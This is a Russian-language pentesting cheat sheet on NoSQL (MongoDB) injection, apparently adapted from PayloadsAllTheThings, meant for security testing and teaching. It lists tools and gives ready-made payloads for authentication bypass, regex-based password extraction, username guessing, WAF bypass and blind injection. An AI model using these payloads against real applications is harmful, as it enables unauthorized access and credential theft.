> Базы данных NoSQL обеспечивают более слабые ограничения согласованности по сравнению с традиционными реляционными базами данных SQL. Требуя меньше реляционных ограничений и проверок целостности, NoSQL-базы данных часто предлагают преимущества в производительности и масштабируемости. Тем не менее, эти базы данных по-прежнему потенциально уязвимы для атак с инъекциями, даже если они не используют традиционный синтаксис SQL.

**Краткое содержание**

* [Инструменты](#Инструменты)
* [Методология](#Методология)
    * [Инъекция операторов](#Инъекция-операторов)
    * [Обход аутентификации](#Обход-аутентификации)
    * [Извлечение информации о длине](#Извлечение-информации-о-длине)
    * [Извлечение информации о данных](#Извлечение-информации-о-данных)
    * [Обход WAF и фильтров](#Обход-WAF-и-фильтров)
* [Слепые NoSQL-инъекции](#Слепые-NoSQL-инъекции)
    * [POST с телом JSON](#POST-с-телом-JSON)
    * [POST с телом в формате application/x-www-form-urlencoded](#POST-с-телом-в-формате-applicationx-www-form-urlencoded)
    * [GET](#GET)
*   Лабораторные работы
*   Ссылки

# База про базы


**Инструменты**

*   [codingo/NoSQLmap](https://github.com/codingo/NoSQLMap) — автоматизированный инструмент для перечисления NoSQL-баз данных и эксплуатации веб-приложений.
*   [digininja/nosqlilab](https://github.com/digininja/nosqlilab) — лабораторная среда для экспериментов с NoSQL-инъекциями.
*   [matrix/Burp-NoSQLiScanner](https://github.com/matrix/Burp-NoSQLiScanner) — расширение для Burp Suite, позволяющее обнаруживать уязвимости NoSQL-инъекций.

**Методология**

> NoSQL-инъекция возникает, когда пользователь манипулирует запросами, внедряя вредоносный ввод в запрос к NoSQL-базе данных. В отличие от SQL-инъекций, NoSQL-инъекции часто используют JSON-запросы и операторы, такие как `$ne`, `$gt`, `$regex` или `$where` в MongoDB.

### Инъекция операторов

| Оператор | Описание                      |
| :------- | :---------------------------- |
| `$ne`    | не равно                      |
| `$regex` | регулярное выражение          |
| `$gt`    | больше чем                    |
| `$lt`    | меньше чем                    |
| `$nin`   | не входит в массив (not in) |

**Пример:** Веб-приложение имеет функцию поиска товаров.

```javascript
db.products.find({ "price": userInput })
```

Пользователь может внедрить NoSQL-запрос: `{ "$gt": 0 }`.

```javascript
db.products.find({ "price": { "$gt": 0 } })
```

Вместо возврата конкретного товара база данных вернет все товары с ценой больше нуля, что приведет к утечке данных.

### Обход аутентификации

Базовый обход аутентификации с использованием операторов "не равно" (`$ne`) или "больше" (`$gt`).

**Данные HTTP (формат `application/x-www-form-urlencoded`):**
```
username[$ne]=toto&password[$ne]=toto
login[$regex]=a.*&pass[$ne]=lol
login[$gt]=admin&login[$lt]=test&pass[$ne]=1
login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto
```

**Данные JSON:**
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$gt":""}, "password": {"$gt":""}}
```

### Извлечение информации о длине

Внедрите полезную нагрузку, используя оператор `$regex`. Инъекция сработает, если длина будет указана правильно.

```
username[$ne]=toto&password[$regex]=.{1}
username[$ne]=toto&password[$regex]=.{3}
```

### Извлечение информации о данных

**Извлечение данных с помощью оператора запроса `$regex`.**

*   **Данные HTTP:**
    ```
    username[$ne]=toto&password[$regex]=m.{2}
    username[$ne]=toto&password[$regex]=md.{1}
    username[$ne]=toto&password[$regex]=mdp
    username[$ne]=toto&password[$regex]=m.*
    username[$ne]=toto&password[$regex]=md.*
    ```

*   **Данные JSON:**
    ```json
    {"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
    {"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
    {"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}
    ```

**Извлечение данных с помощью оператора запроса `$in`.**
```json
{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
```

### Обход WAF и фильтров

**Удаление предварительного условия:**

В MongoDB, если документ содержит дублирующиеся ключи, только последнее вхождение ключа будет иметь приоритет.
```json
{"id":"10", "id":"100"}
```
В этом случае окончательным значением "id" будет "100". Это можно использовать для обхода фильтров или WAF, которые проверяют только первое значение ключа.

# Слепые NoSQL-инъекции

### POST с телом JSON:
```json
{"username": {"$regex": "^admin$"}, "password": {"$regex": "^password$"}}
```

### POST с телом в формате `application/x-www-form-urlencoded`
```
username[$regex]=^admin$&password[$regex]=^password$
```

### GET (передача параметров через URL)
```
/?username[$regex]=^admin$&password[$regex]=^password$
```

*   [OWASP Testing Guide: Testing for NoSQL Injection](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection)
*   [NoSQL Injection in MongoDB](https://www.mongodb.com/docs/manual/faq/fundamentals/#how-does-mongodb-address-sql-or-query-injection-)
*   [PayloadsAllTheThings - NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
